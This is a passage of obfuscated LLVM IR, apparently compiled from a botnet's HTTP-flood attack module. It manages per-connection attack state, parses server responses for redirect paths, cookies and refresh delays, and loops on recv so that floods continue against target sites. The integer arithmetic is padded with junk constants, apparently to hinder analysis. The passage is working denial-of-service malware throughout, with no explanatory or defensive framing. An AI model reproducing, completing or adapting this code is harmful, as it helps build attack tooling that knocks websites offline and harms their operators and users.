  %1816 = getelementptr inbounds i8, i8* %1809, i64 %1815
  %1817 = call i32 @util_strcpy(i8* %1808, i8* %1816)
  br label %1818

; <label>:1818:                                   ; preds = %1804, %1790
  br label %1819

; <label>:1819:                                   ; preds = %1818, %1779
  br label %1866

; <label>:1820:                                   ; preds = %1695
  %1821 = load i8*, i8** %54, align 8
  %1822 = getelementptr inbounds i8, i8* %1821, i64 0
  %1823 = load i8, i8* %1822, align 1
  %1824 = sext i8 %1823 to i32
  %1825 = icmp eq i32 %1824, 47
  br i1 %1825, label %1826, label %1865

; <label>:1826:                                   ; preds = %1820
  %1827 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1828 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1827, i32 0, i32 6
  %1829 = getelementptr inbounds [257 x i8], [257 x i8]* %1828, i32 0, i32 0
  %1830 = getelementptr inbounds i8, i8* %1829, i64 1
  call void @util_zero(i8* %1830, i32 255)
  %1831 = load i8*, i8** %54, align 8
  %1832 = load i32, i32* %10, align 4
  %1833 = sub i32 0, 1
  %1834 = sub i32 %1832, %1833
  %1835 = add nsw i32 %1832, 1
  %1836 = sext i32 %1834 to i64
  %1837 = getelementptr inbounds i8, i8* %1831, i64 %1836
  %1838 = call i32 @util_strlen(i8* %1837)
  %1839 = icmp sgt i32 %1838, 0
  br i1 %1839, label %1840, label %1864

; <label>:1840:                                   ; preds = %1826
  %1841 = load i8*, i8** %54, align 8
  %1842 = load i32, i32* %10, align 4
  %1843 = add i32 %1842, -834515682
  %1844 = add i32 %1843, 1
  %1845 = sub i32 %1844, -834515682
  %1846 = add nsw i32 %1842, 1
  %1847 = sext i32 %1845 to i64
  %1848 = getelementptr inbounds i8, i8* %1841, i64 %1847
  %1849 = call i32 @util_strlen(i8* %1848)
  %1850 = icmp slt i32 %1849, 256
  br i1 %1850, label %1851, label %1864

; <label>:1851:                                   ; preds = %1840
  %1852 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1853 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1852, i32 0, i32 6
  %1854 = getelementptr inbounds [257 x i8], [257 x i8]* %1853, i32 0, i32 0
  %1855 = getelementptr inbounds i8, i8* %1854, i64 1
  %1856 = load i8*, i8** %54, align 8
  %1857 = load i32, i32* %10, align 4
  %1858 = sub i32 0, 1
  %1859 = sub i32 %1857, %1858
  %1860 = add nsw i32 %1857, 1
  %1861 = sext i32 %1859 to i64
  %1862 = getelementptr inbounds i8, i8* %1856, i64 %1861
  %1863 = call i32 @util_strcpy(i8* %1855, i8* %1862)
  br label %1864

; <label>:1864:                                   ; preds = %1851, %1840, %1826
  br label %1865

; <label>:1865:                                   ; preds = %1864, %1820
  br label %1866

; <label>:1866:                                   ; preds = %1865, %1819
  %1867 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1868 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1867, i32 0, i32 1
  store i8 1, i8* %1868, align 4
  br label %2797

; <label>:1869:                                   ; preds = %1670
  br label %1870

; <label>:1870:                                   ; preds = %1869, %1647
  %1871 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1872 = load i32, i32* %12, align 4
  %1873 = call i8* @table_retrieve_val(i32 53, i32* null)
  %1874 = call i32 @util_stristr(i8* %1871, i32 %1872, i8* %1873)
  %1875 = icmp ne i32 %1874, -1
  br i1 %1875, label %1876, label %2271

; <label>:1876:                                   ; preds = %1870
  %1877 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1878 = load i32, i32* %12, align 4
  %1879 = call i8* @table_retrieve_val(i32 53, i32* null)
  %1880 = call i32 @util_stristr(i8* %1877, i32 %1878, i8* %1879)
  store i32 %1880, i32* %55, align 4
  %1881 = load i32, i32* %55, align 4
  %1882 = sext i32 %1881 to i64
  %1883 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1882
  %1884 = load i8, i8* %1883, align 1
  %1885 = sext i8 %1884 to i32
  %1886 = icmp eq i32 %1885, 32
  br i1 %1886, label %1887, label %1893

; <label>:1887:                                   ; preds = %1876
  %1888 = load i32, i32* %55, align 4
  %1889 = add i32 %1888, 1572539125
  %1890 = add i32 %1889, 1
  %1891 = sub i32 %1890, 1572539125
  %1892 = add nsw i32 %1888, 1
  store i32 %1891, i32* %55, align 4
  br label %1893

; <label>:1893:                                   ; preds = %1887, %1876
  %1894 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1895 = load i32, i32* %55, align 4
  %1896 = sext i32 %1895 to i64
  %1897 = getelementptr inbounds i8, i8* %1894, i64 %1896
  %1898 = load i32, i32* %12, align 4
  %1899 = load i32, i32* %55, align 4
  %1900 = sub i32 0, %1899
  %1901 = add i32 %1898, %1900
  %1902 = sub nsw i32 %1898, %1899
  %1903 = call i32 @util_memsearch(i8* %1897, i32 %1901, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1903, i32* %56, align 4
  %1904 = load i32, i32* %56, align 4
  %1905 = icmp ne i32 %1904, -1
  br i1 %1905, label %1906, label %2270

; <label>:1906:                                   ; preds = %1893
  %1907 = load i32, i32* %55, align 4
  %1908 = sext i32 %1907 to i64
  %1909 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1908
  store i8* %1909, i8** %57, align 8
  %1910 = load i32, i32* %56, align 4
  %1911 = icmp sge i32 %1910, 2
  br i1 %1911, label %1912, label %1918

; <label>:1912:                                   ; preds = %1906
  %1913 = load i32, i32* %56, align 4
  %1914 = add i32 %1913, -699770050
  %1915 = sub i32 %1914, 2
  %1916 = sub i32 %1915, -699770050
  %1917 = sub nsw i32 %1913, 2
  store i32 %1916, i32* %56, align 4
  br label %1918

; <label>:1918:                                   ; preds = %1912, %1906
  %1919 = load i32, i32* %55, align 4
  %1920 = load i32, i32* %56, align 4
  %1921 = sub i32 0, %1919
  %1922 = sub i32 0, %1920
  %1923 = add i32 %1921, %1922
  %1924 = sub i32 0, %1923
  %1925 = add nsw i32 %1919, %1920
  %1926 = sext i32 %1924 to i64
  %1927 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1926
  store i8 0, i8* %1927, align 1
  %1928 = load i32, i32* %56, align 4
  %1929 = sub i32 0, 1
  %1930 = sub i32 %1928, %1929
  %1931 = add nsw i32 %1928, 1
  store i32 %1930, i32* %56, align 4
  store i32 0, i32* %10, align 4
  br label %1932

; <label>:1932:                                   ; preds = %1958, %1918
  %1933 = load i8*, i8** %57, align 8
  %1934 = load i32, i32* %10, align 4
  %1935 = sext i32 %1934 to i64
  %1936 = getelementptr inbounds i8, i8* %1933, i64 %1935
  %1937 = load i8, i8* %1936, align 1
  %1938 = sext i8 %1937 to i32
  %1939 = icmp ne i32 %1938, 0
  br i1 %1939, label %1940, label %1956

; <label>:1940:                                   ; preds = %1932
  %1941 = load i8*, i8** %57, align 8
  %1942 = load i32, i32* %10, align 4
  %1943 = sext i32 %1942 to i64
  %1944 = getelementptr inbounds i8, i8* %1941, i64 %1943
  %1945 = load i8, i8* %1944, align 1
  %1946 = sext i8 %1945 to i32
  %1947 = icmp sge i32 %1946, 48
  br i1 %1947, label %1948, label %1956

; <label>:1948:                                   ; preds = %1940
  %1949 = load i8*, i8** %57, align 8
  %1950 = load i32, i32* %10, align 4
  %1951 = sext i32 %1950 to i64
  %1952 = getelementptr inbounds i8, i8* %1949, i64 %1951
  %1953 = load i8, i8* %1952, align 1
  %1954 = sext i8 %1953 to i32
  %1955 = icmp sle i32 %1954, 57
  br label %1956

; <label>:1956:                                   ; preds = %1948, %1940, %1932
  %1957 = phi i1 [ false, %1940 ], [ false, %1932 ], [ %1955, %1948 ]
  br i1 %1957, label %1958, label %1964

; <label>:1958:                                   ; preds = %1956
  %1959 = load i32, i32* %10, align 4
  %1960 = sub i32 %1959, -647304106
  %1961 = add i32 %1960, 1
  %1962 = add i32 %1961, -647304106
  %1963 = add nsw i32 %1959, 1
  store i32 %1962, i32* %10, align 4
  br label %1932

; <label>:1964:                                   ; preds = %1956
  %1965 = load i8*, i8** %57, align 8
  %1966 = load i32, i32* %10, align 4
  %1967 = sext i32 %1966 to i64
  %1968 = getelementptr inbounds i8, i8* %1965, i64 %1967
  %1969 = load i8, i8* %1968, align 1
  %1970 = sext i8 %1969 to i32
  %1971 = icmp ne i32 %1970, 0
  br i1 %1971, label %1972, label %2269

; <label>:1972:                                   ; preds = %1964
  store i32 0, i32* %58, align 4
  %1973 = load i8*, i8** %57, align 8
  %1974 = load i32, i32* %10, align 4
  %1975 = sext i32 %1974 to i64
  %1976 = getelementptr inbounds i8, i8* %1973, i64 %1975
  store i8 0, i8* %1976, align 1
  %1977 = load i32, i32* %10, align 4
  %1978 = sub i32 %1977, 218241297
  %1979 = add i32 %1978, 1
  %1980 = add i32 %1979, 218241297
  %1981 = add nsw i32 %1977, 1
  store i32 %1980, i32* %10, align 4
  %1982 = load i8*, i8** %57, align 8
  %1983 = load i32, i32* %10, align 4
  %1984 = sext i32 %1983 to i64
  %1985 = getelementptr inbounds i8, i8* %1982, i64 %1984
  %1986 = load i8, i8* %1985, align 1
  %1987 = sext i8 %1986 to i32
  %1988 = icmp eq i32 %1987, 32
  br i1 %1988, label %1989, label %1995

; <label>:1989:                                   ; preds = %1972
  %1990 = load i32, i32* %10, align 4
  %1991 = add i32 %1990, 1818106631
  %1992 = add i32 %1991, 1
  %1993 = sub i32 %1992, 1818106631
  %1994 = add nsw i32 %1990, 1
  store i32 %1993, i32* %10, align 4
  br label %1995

; <label>:1995:                                   ; preds = %1989, %1972
  %1996 = load i8*, i8** %57, align 8
  %1997 = load i32, i32* %10, align 4
  %1998 = sext i32 %1997 to i64
  %1999 = getelementptr inbounds i8, i8* %1996, i64 %1998
  %2000 = load i8*, i8** %57, align 8
  %2001 = load i32, i32* %10, align 4
  %2002 = sext i32 %2001 to i64
  %2003 = getelementptr inbounds i8, i8* %2000, i64 %2002
  %2004 = call i32 @util_strlen(i8* %2003)
  %2005 = call i32 @util_stristr(i8* %1999, i32 %2004, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.11, i32 0, i32 0))
  %2006 = icmp ne i32 %2005, -1
  br i1 %2006, label %2007, label %2022

; <label>:2007:                                   ; preds = %1995
  %2008 = load i8*, i8** %57, align 8
  %2009 = load i32, i32* %10, align 4
  %2010 = sext i32 %2009 to i64
  %2011 = getelementptr inbounds i8, i8* %2008, i64 %2010
  %2012 = load i8*, i8** %57, align 8
  %2013 = load i32, i32* %10, align 4
  %2014 = sext i32 %2013 to i64
  %2015 = getelementptr inbounds i8, i8* %2012, i64 %2014
  %2016 = call i32 @util_strlen(i8* %2015)
  %2017 = call i32 @util_stristr(i8* %2011, i32 %2016, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.11, i32 0, i32 0))
  %2018 = load i32, i32* %10, align 4
  %2019 = sub i32 0, %2017
  %2020 = sub i32 %2018, %2019
  %2021 = add nsw i32 %2018, %2017
  store i32 %2020, i32* %10, align 4
  br label %2022

; <label>:2022:                                   ; preds = %2007, %1995
  %2023 = load i8*, i8** %57, align 8
  %2024 = load i32, i32* %10, align 4
  %2025 = sext i32 %2024 to i64
  %2026 = getelementptr inbounds i8, i8* %2023, i64 %2025
  %2027 = load i8, i8* %2026, align 1
  %2028 = sext i8 %2027 to i32
  %2029 = icmp eq i32 %2028, 34
  br i1 %2029, label %2030, label %2072

; <label>:2030:                                   ; preds = %2022
  %2031 = load i32, i32* %10, align 4
  %2032 = sub i32 0, %2031
  %2033 = sub i32 0, 1
  %2034 = add i32 %2032, %2033
  %2035 = sub i32 0, %2034
  %2036 = add nsw i32 %2031, 1
  store i32 %2035, i32* %10, align 4
  %2037 = load i8*, i8** %57, align 8
  %2038 = load i32, i32* %10, align 4
  %2039 = sext i32 %2038 to i64
  %2040 = getelementptr inbounds i8, i8* %2037, i64 %2039
  %2041 = load i8*, i8** %57, align 8
  %2042 = load i32, i32* %10, align 4
  %2043 = sext i32 %2042 to i64
  %2044 = getelementptr inbounds i8, i8* %2041, i64 %2043
  %2045 = call i32 @util_strlen(i8* %2044)
  %2046 = add i32 %2045, -556384778
  %2047 = sub i32 %2046, 1
  %2048 = sub i32 %2047, -556384778
  %2049 = sub nsw i32 %2045, 1
  %2050 = sext i32 %2048 to i64
  %2051 = getelementptr inbounds i8, i8* %2040, i64 %2050
  %2052 = load i8, i8* %2051, align 1
  %2053 = sext i8 %2052 to i32
  %2054 = icmp eq i32 %2053, 34
  br i1 %2054, label %2055, label %2071

; <label>:2055:                                   ; preds = %2030
  %2056 = load i8*, i8** %57, align 8
  %2057 = load i32, i32* %10, align 4
  %2058 = sext i32 %2057 to i64
  %2059 = getelementptr inbounds i8, i8* %2056, i64 %2058
  %2060 = load i8*, i8** %57, align 8
  %2061 = load i32, i32* %10, align 4
  %2062 = sext i32 %2061 to i64
  %2063 = getelementptr inbounds i8, i8* %2060, i64 %2062
  %2064 = call i32 @util_strlen(i8* %2063)
  %2065 = add i32 %2064, -2143740976
  %2066 = sub i32 %2065, 1
  %2067 = sub i32 %2066, -2143740976
  %2068 = sub nsw i32 %2064, 1
  %2069 = sext i32 %2067 to i64
  %2070 = getelementptr inbounds i8, i8* %2059, i64 %2069
  store i8 0, i8* %2070, align 1
  br label %2071

; <label>:2071:                                   ; preds = %2055, %2030
  br label %2072

; <label>:2072:                                   ; preds = %2071, %2022
  %2073 = load i8*, i8** %57, align 8
  %2074 = call i32 @util_atoi(i8* %2073, i32 10)
  store i32 %2074, i32* %58, align 4
  br label %2075

; <label>:2075:                                   ; preds = %2094, %2072
  %2076 = load i32, i32* %58, align 4
  %2077 = icmp sgt i32 %2076, 0
  br i1 %2077, label %2078, label %2092

; <label>:2078:                                   ; preds = %2075
  %2079 = load i32, i32* %58, align 4
  %2080 = icmp slt i32 %2079, 10
  br i1 %2080, label %2081, label %2092

; <label>:2081:                                   ; preds = %2078
  %2082 = load i32, i32* %27, align 4
  %2083 = load i32, i32* %58, align 4
  %2084 = sub i32 0, %2082
  %2085 = sub i32 0, %2083
  %2086 = add i32 %2084, %2085
  %2087 = sub i32 0, %2086
  %2088 = add i32 %2082, %2083
  %2089 = zext i32 %2087 to i64
  %2090 = call i64 @time(i64* null) #6
  %2091 = icmp sgt i64 %2089, %2090
  br label %2092

; <label>:2092:                                   ; preds = %2081, %2078, %2075
  %2093 = phi i1 [ false, %2078 ], [ false, %2075 ], [ %2091, %2081 ]
  br i1 %2093, label %2094, label %2096

; <label>:2094:                                   ; preds = %2092
  %2095 = call i32 @sleep(i32 1)
  br label %2075

; <label>:2096:                                   ; preds = %2092
  %2097 = load i8*, i8** %57, align 8
  %2098 = load i32, i32* %10, align 4
  %2099 = sext i32 %2098 to i64
  %2100 = getelementptr inbounds i8, i8* %2097, i64 %2099
  store i8* %2100, i8** %57, align 8
  %2101 = load i8*, i8** %57, align 8
  %2102 = load i8*, i8** %57, align 8
  %2103 = call i32 @util_strlen(i8* %2102)
  %2104 = call i32 @util_stristr(i8* %2101, i32 %2103, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.10, i32 0, i32 0))
  %2105 = icmp eq i32 %2104, 4
  br i1 %2105, label %2106, label %2214

; <label>:2106:                                   ; preds = %2096
  store i32 7, i32* %10, align 4
  %2107 = load i8*, i8** %57, align 8
  %2108 = getelementptr inbounds i8, i8* %2107, i64 4
  %2109 = load i8, i8* %2108, align 1
  %2110 = sext i8 %2109 to i32
  %2111 = icmp eq i32 %2110, 115
  br i1 %2111, label %2112, label %2118

; <label>:2112:                                   ; preds = %2106
  %2113 = load i32, i32* %10, align 4
  %2114 = sub i32 %2113, 1343960903
  %2115 = add i32 %2114, 1
  %2116 = add i32 %2115, 1343960903
  %2117 = add nsw i32 %2113, 1
  store i32 %2116, i32* %10, align 4
  br label %2118

; <label>:2118:                                   ; preds = %2112, %2106
  %2119 = load i8*, i8** %57, align 8
  %2120 = load i8*, i8** %57, align 8
  %2121 = load i32, i32* %10, align 4
  %2122 = sext i32 %2121 to i64
  %2123 = getelementptr inbounds i8, i8* %2120, i64 %2122
  %2124 = load i32, i32* %56, align 4
  %2125 = load i32, i32* %10, align 4
  %2126 = add i32 %2124, 1947770949
  %2127 = sub i32 %2126, %2125
  %2128 = sub i32 %2127, 1947770949
  %2129 = sub nsw i32 %2124, %2125
  %2130 = sext i32 %2128 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %2119, i8* %2123, i64 %2130, i32 1, i1 false)
  store i32 0, i32* %10, align 4
  br label %2131

; <label>:2131:                                   ; preds = %2152, %2118
  %2132 = load i8*, i8** %57, align 8
  %2133 = load i32, i32* %10, align 4
  %2134 = sext i32 %2133 to i64
  %2135 = getelementptr inbounds i8, i8* %2132, i64 %2134
  %2136 = load i8, i8* %2135, align 1
  %2137 = sext i8 %2136 to i32
  %2138 = icmp ne i32 %2137, 0
  br i1 %2138, label %2139, label %2158

; <label>:2139:                                   ; preds = %2131
  %2140 = load i8*, i8** %57, align 8
  %2141 = load i32, i32* %10, align 4
  %2142 = sext i32 %2141 to i64
  %2143 = getelementptr inbounds i8, i8* %2140, i64 %2142
  %2144 = load i8, i8* %2143, align 1
  %2145 = sext i8 %2144 to i32
  %2146 = icmp eq i32 %2145, 47
  br i1 %2146, label %2147, label %2152

; <label>:2147:                                   ; preds = %2139
  %2148 = load i8*, i8** %57, align 8
  %2149 = load i32, i32* %10, align 4
  %2150 = sext i32 %2149 to i64
  %2151 = getelementptr inbounds i8, i8* %2148, i64 %2150
  store i8 0, i8* %2151, align 1
  br label %2158

; <label>:2152:                                   ; preds = %2139
  %2153 = load i32, i32* %10, align 4
  %2154 = add i32 %2153, 134197100
  %2155 = add i32 %2154, 1
  %2156 = sub i32 %2155, 134197100
  %2157 = add nsw i32 %2153, 1
  store i32 %2156, i32* %10, align 4
  br label %2131

; <label>:2158:                                   ; preds = %2147, %2131
  %2159 = load i8*, i8** %57, align 8
  %2160 = call i32 @util_strlen(i8* %2159)
  %2161 = icmp sgt i32 %2160, 0
  br i1 %2161, label %2162, label %2172

; <label>:2162:                                   ; preds = %2158
  %2163 = load i8*, i8** %57, align 8
  %2164 = call i32 @util_strlen(i8* %2163)
  %2165 = icmp slt i32 %2164, 128
  br i1 %2165, label %2166, label %2172

; <label>:2166:                                   ; preds = %2162
  %2167 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2168 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2167, i32 0, i32 7
  %2169 = getelementptr inbounds [129 x i8], [129 x i8]* %2168, i32 0, i32 0
  %2170 = load i8*, i8** %57, align 8
  %2171 = call i32 @util_strcpy(i8* %2169, i8* %2170)
  br label %2172

; <label>:2172:                                   ; preds = %2166, %2162, %2158
  %2173 = load i8*, i8** %57, align 8
  %2174 = load i32, i32* %10, align 4
  %2175 = add i32 %2174, 1033754154
  %2176 = add i32 %2175, 1
  %2177 = sub i32 %2176, 1033754154
  %2178 = add nsw i32 %2174, 1
  %2179 = sext i32 %2177 to i64
  %2180 = getelementptr inbounds i8, i8* %2173, i64 %2179
  %2181 = call i32 @util_strlen(i8* %2180)
  %2182 = icmp slt i32 %2181, 256
  br i1 %2182, label %2183, label %2213

; <label>:2183:                                   ; preds = %2172
  %2184 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2185 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2184, i32 0, i32 6
  %2186 = getelementptr inbounds [257 x i8], [257 x i8]* %2185, i32 0, i32 0
  %2187 = getelementptr inbounds i8, i8* %2186, i64 1
  call void @util_zero(i8* %2187, i32 255)
  %2188 = load i8*, i8** %57, align 8
  %2189 = load i32, i32* %10, align 4
  %2190 = sub i32 0, %2189
  %2191 = sub i32 0, 1
  %2192 = add i32 %2190, %2191
  %2193 = sub i32 0, %2192
  %2194 = add nsw i32 %2189, 1
  %2195 = sext i32 %2193 to i64
  %2196 = getelementptr inbounds i8, i8* %2188, i64 %2195
  %2197 = call i32 @util_strlen(i8* %2196)
  %2198 = icmp sgt i32 %2197, 0
  br i1 %2198, label %2199, label %2212

; <label>:2199:                                   ; preds = %2183
  %2200 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2201 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2200, i32 0, i32 6
  %2202 = getelementptr inbounds [257 x i8], [257 x i8]* %2201, i32 0, i32 0
  %2203 = getelementptr inbounds i8, i8* %2202, i64 1
  %2204 = load i8*, i8** %57, align 8
  %2205 = load i32, i32* %10, align 4
  %2206 = sub i32 0, 1
  %2207 = sub i32 %2205, %2206
  %2208 = add nsw i32 %2205, 1
  %2209 = sext i32 %2207 to i64
  %2210 = getelementptr inbounds i8, i8* %2204, i64 %2209
  %2211 = call i32 @util_strcpy(i8* %2203, i8* %2210)
  br label %2212

; <label>:2212:                                   ; preds = %2199, %2183
  br label %2213

; <label>:2213:                                   ; preds = %2212, %2172
  br label %2262

; <label>:2214:                                   ; preds = %2096
  %2215 = load i8*, i8** %57, align 8
  %2216 = getelementptr inbounds i8, i8* %2215, i64 0
  %2217 = load i8, i8* %2216, align 1
  %2218 = sext i8 %2217 to i32
  %2219 = icmp eq i32 %2218, 47
  br i1 %2219, label %2220, label %2261

; <label>:2220:                                   ; preds = %2214
  %2221 = load i8*, i8** %57, align 8
  %2222 = load i32, i32* %10, align 4
  %2223 = sub i32 %2222, 1498759938
  %2224 = add i32 %2223, 1
  %2225 = add i32 %2224, 1498759938
  %2226 = add nsw i32 %2222, 1
  %2227 = sext i32 %2225 to i64
  %2228 = getelementptr inbounds i8, i8* %2221, i64 %2227
  %2229 = call i32 @util_strlen(i8* %2228)
  %2230 = icmp slt i32 %2229, 256
  br i1 %2230, label %2231, label %2260

; <label>:2231:                                   ; preds = %2220
  %2232 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2233 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2232, i32 0, i32 6
  %2234 = getelementptr inbounds [257 x i8], [257 x i8]* %2233, i32 0, i32 0
  %2235 = getelementptr inbounds i8, i8* %2234, i64 1
  call void @util_zero(i8* %2235, i32 255)
  %2236 = load i8*, i8** %57, align 8
  %2237 = load i32, i32* %10, align 4
  %2238 = sub i32 0, 1
  %2239 = sub i32 %2237, %2238
  %2240 = add nsw i32 %2237, 1
  %2241 = sext i32 %2239 to i64
  %2242 = getelementptr inbounds i8, i8* %2236, i64 %2241
  %2243 = call i32 @util_strlen(i8* %2242)
  %2244 = icmp sgt i32 %2243, 0
  br i1 %2244, label %2245, label %2259

; <label>:2245:                                   ; preds = %2231
  %2246 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2247 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2246, i32 0, i32 6
  %2248 = getelementptr inbounds [257 x i8], [257 x i8]* %2247, i32 0, i32 0
  %2249 = getelementptr inbounds i8, i8* %2248, i64 1
  %2250 = load i8*, i8** %57, align 8
  %2251 = load i32, i32* %10, align 4
  %2252 = add i32 %2251, 1934976470
  %2253 = add i32 %2252, 1
  %2254 = sub i32 %2253, 1934976470
  %2255 = add nsw i32 %2251, 1
  %2256 = sext i32 %2254 to i64
  %2257 = getelementptr inbounds i8, i8* %2250, i64 %2256
  %2258 = call i32 @util_strcpy(i8* %2249, i8* %2257)
  br label %2259

; <label>:2259:                                   ; preds = %2245, %2231
  br label %2260

; <label>:2260:                                   ; preds = %2259, %2220
  br label %2261

; <label>:2261:                                   ; preds = %2260, %2214
  br label %2262

; <label>:2262:                                   ; preds = %2261, %2213
  %2263 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2264 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2263, i32 0, i32 9
  %2265 = getelementptr inbounds [9 x i8], [9 x i8]* %2264, i32 0, i32 0
  %2266 = call i8* @strcpy(i8* %2265, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i32 0, i32 0)) #6
  %2267 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2268 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2267, i32 0, i32 1
  store i8 10, i8* %2268, align 4
  br label %2797

; <label>:2269:                                   ; preds = %1964
  br label %2270

; <label>:2270:                                   ; preds = %2269, %1893
  br label %2271

; <label>:2271:                                   ; preds = %2270, %1870
  %2272 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %2273 = load i32, i32* %12, align 4
  %2274 = call i32 @util_memsearch(i8* %2272, i32 %2273, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i32 0, i32 0), i32 4)
  store i32 %2274, i32* %37, align 4
  %2275 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2276 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2275, i32 0, i32 9
  %2277 = getelementptr inbounds [9 x i8], [9 x i8]* %2276, i32 0, i32 0
  %2278 = call signext i8 @util_strcmp(i8* %2277, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.12, i32 0, i32 0))
  %2279 = sext i8 %2278 to i32
  %2280 = icmp ne i32 %2279, 0
  br i1 %2280, label %2288, label %2281

; <label>:2281:                                   ; preds = %2271
  %2282 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2283 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2282, i32 0, i32 9
  %2284 = getelementptr inbounds [9 x i8], [9 x i8]* %2283, i32 0, i32 0
  %2285 = call signext i8 @util_strcmp(i8* %2284, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i32 0, i32 0))
  %2286 = sext i8 %2285 to i32
  %2287 = icmp ne i32 %2286, 0
  br i1 %2287, label %2288, label %2291

; <label>:2288:                                   ; preds = %2281, %2271
  %2289 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2290 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2289, i32 0, i32 1
  store i8 7, i8* %2290, align 4
  br label %2302

; <label>:2291:                                   ; preds = %2281
  %2292 = load i32, i32* %12, align 4
  %2293 = load i32, i32* %37, align 4
  %2294 = icmp sgt i32 %2292, %2293
  br i1 %2294, label %2295, label %2298

; <label>:2295:                                   ; preds = %2291
  %2296 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2297 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2296, i32 0, i32 1
  store i8 10, i8* %2297, align 4
  br label %2301

; <label>:2298:                                   ; preds = %2291
  %2299 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2300 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2299, i32 0, i32 1
  store i8 1, i8* %2300, align 4
  br label %2301

; <label>:2301:                                   ; preds = %2298, %2295
  br label %2302

; <label>:2302:                                   ; preds = %2301, %2288
  %2303 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2304 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2303, i32 0, i32 0
  %2305 = load i32, i32* %2304, align 4
  %2306 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %2307 = load i32, i32* %37, align 4
  %2308 = sext i32 %2307 to i64
  %2309 = call i64 @recv(i32 %2305, i8* %2306, i64 %2308, i32 16384)
  %2310 = trunc i64 %2309 to i32
  store i32 %2310, i32* %12, align 4
  br label %2795

; <label>:2311:                                   ; preds = %1154
  %2312 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2313 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2312, i32 0, i32 1
  %2314 = load i8, i8* %2313, align 4
  %2315 = zext i8 %2314 to i32
  %2316 = icmp eq i32 %2315, 7
  br i1 %2316, label %2317, label %2742

; <label>:2317:                                   ; preds = %2311
  br label %2318

; <label>:2318:                                   ; preds = %2740, %2317
  %2319 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2320 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2319, i32 0, i32 1
  %2321 = load i8, i8* %2320, align 4
  %2322 = zext i8 %2321 to i32
  %2323 = icmp ne i32 %2322, 7
  br i1 %2323, label %2324, label %2325

; <label>:2324:                                   ; preds = %2318
  br label %2741

; <label>:2325:                                   ; preds = %2318
  %2326 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2327 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2326, i32 0, i32 17
  %2328 = load i32, i32* %2327, align 4
  %2329 = icmp eq i32 %2328, 1024
  br i1 %2329, label %2330, label %2345

; <label>:2330:                                   ; preds = %2325
  %2331 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2332 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2331, i32 0, i32 18
  %2333 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2332, i32 0, i32 0
  %2334 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2335 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2334, i32 0, i32 18
  %2336 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2335, i32 0, i32 0
  %2337 = getelementptr inbounds i8, i8* %2336, i64 64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %2333, i8* %2337, i64 960, i32 1, i1 false)
  %2338 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
